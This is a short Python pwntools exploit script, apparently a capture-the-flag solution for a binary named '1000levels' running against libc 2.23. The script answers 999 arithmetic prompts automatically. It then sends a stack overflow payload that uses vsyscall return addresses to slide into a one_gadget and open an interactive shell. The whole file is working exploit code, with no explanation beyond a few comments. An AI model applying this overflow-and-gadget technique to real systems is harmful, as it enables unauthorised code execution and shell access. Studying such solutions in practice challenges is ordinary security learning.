#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'
io = process(['./1000levels'], env={'LD_PRELOAD':'./libc-2.23.so'})

one_gadget = 0x4526a
system_offset = 0x45390
ret_addr = 0xffffffffff600000

def go(levels, more):
    io.sendlineafter("Choice:\n", '1')
    io.sendlineafter("levels?\n", str(levels))
    io.sendlineafter("more?\n", str(more))

def hint():
    io.sendlineafter("Choice:\n", '2')

if __name__ == "__main__":
    hint()
    go(0, one_gadget - system_offset)

    for i in range(999):
        io.recvuntil("Question: ")
        a = int(io.recvuntil(" ")[:-1])
        io.recvuntil("* ")
        b = int(io.recvuntil(" ")[:-1])
        io.sendlineafter("Answer:", str(a * b))

    payload  = 'A' * 0x30   # buffer
    payload += 'B' * 0x8    # rbp
    payload += p64(ret_addr) * 3
    io.sendafter("Answer:", payload)
    
    io.interactive()
